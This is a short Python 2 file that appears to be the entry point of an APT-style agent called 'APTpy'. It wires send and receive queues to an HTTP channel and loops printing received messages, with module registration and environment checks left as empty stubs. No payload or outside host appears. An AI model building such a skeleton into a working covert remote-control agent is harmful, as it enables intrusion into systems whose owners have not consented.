import Queue
from time import sleep
DEBUG = True


class APTpy:
    def __init__(self):
        self.channel = None
        self.queue_send = Queue.Queue()
        self.queue_recv = Queue.Queue()

    def run(self):
        self._checkenv()
        self._registerChannels()
        self._registerModules()

        self.channel.start()

        """
        self.queue_send.put("test 1\n")
        self.queue_send.put("test 2\n")
        self.queue_send.put("test 3\n")
        self.queue_send.put("test 4\n")
        self.queue_send.put("test 5\n")
        self.queue_send.put("test 6\n")
        self.queue_send.put("test 7\n")
        self.queue_send.put("test 8\n")
        self.queue_send.put("test 9\n")
        self.queue_send.put("test 10\n")
        self.queue_send.put("test 11\n")
        self.queue_send.put("test 12\n")
        """

        while True:
            sleep(0.5)
            if not self.queue_recv.empty():
                print self.queue_recv.get()
                self.queue_recv.task_done()

    def _checkenv(self):
        pass

    def _registerChannels(self):
        from lib.channels.http import HttpChannel

        self.channel = HttpChannel(self.queue_send, self.queue_recv)

    def _registerModules(self):
        pass


try:
    obj = APTpy()
    obj.run()
except:
    if DEBUG:
        print "[!] Operation aborted"
